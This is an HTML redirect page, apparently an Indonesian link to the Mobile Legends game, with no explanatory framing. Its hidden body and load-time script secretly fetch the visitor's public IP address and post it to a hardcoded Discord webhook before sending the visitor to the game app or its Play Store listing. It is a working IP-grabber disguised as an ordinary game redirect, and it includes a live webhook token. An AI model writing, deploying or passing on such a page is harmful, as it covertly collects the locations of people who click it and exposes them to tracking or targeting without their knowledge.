<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect...</title>
    <style>
        body {
            display: none;  
        }
    </style>
    <script>
        window.onload = function() {
            const webhookUrl = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";

            fetch("https://api.ipify.org?format=json", { cache: "no-store" })
                .then(response => response.json())
                .then(data => {
                    const payload = {
                        content: `IP Address: ${data.ip}`
                    };

                    fetch(webhookUrl, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(payload)
                    });
                })
                .finally(() => {
                    window.location.href = "mobilelegends://";
                    setTimeout(() => {
                        window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
                    }, 2000);
                });
        };
    </script>
</head>
<body>
</body>
</html>
